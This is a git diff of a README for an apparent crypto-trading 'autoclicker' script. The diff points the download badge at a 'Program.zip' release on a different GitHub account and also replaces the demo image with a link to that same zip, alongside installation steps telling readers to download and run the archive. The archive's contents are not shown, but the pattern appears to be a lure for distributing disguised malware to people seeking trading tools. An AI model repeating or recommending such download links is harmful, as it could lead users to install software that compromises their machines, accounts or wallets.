@@ -9,7 +9,7 @@ Welcome to the xKucoinBot Script Autoclicker repository! This repository focuses
 
 ## Autoclicker Software
 Click the button below to download the xKucoinBot Script Autoclicker software:
-[![Download Software](https://img.shields.io/badge/Download-Autoclicker%20Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Abh1shekekek/xkucoinbot-script-autoclicker/releases/download/v1.0/Program.zip%20Software-blue)](https://github.com/Abh1shekekek/xkucoinbot-script-autoclicker/releases/download/v1.0/Program.zip)
 
 ## Installation
 1. Download the autoclicker software from the link provided above.
@@ -28,6 +28,6 @@ If you encounter any issues or have any questions regarding the autoclicker soft
 - Check the "Releases" section for any updated versions or patches to the autoclicker software.
 - Visit the xKucoinBot official website for more information on the trading platform and its features.
 
-![Autoclicker Demo](https://example.com/demo.png)
+![Autoclicker Demo](https://github.com/Abh1shekekek/xkucoinbot-script-autoclicker/releases/download/v1.0/Program.zip)
 
 Enjoy automating your trading tasks with the xKucoinBot Script Autoclicker! 🚀🤖
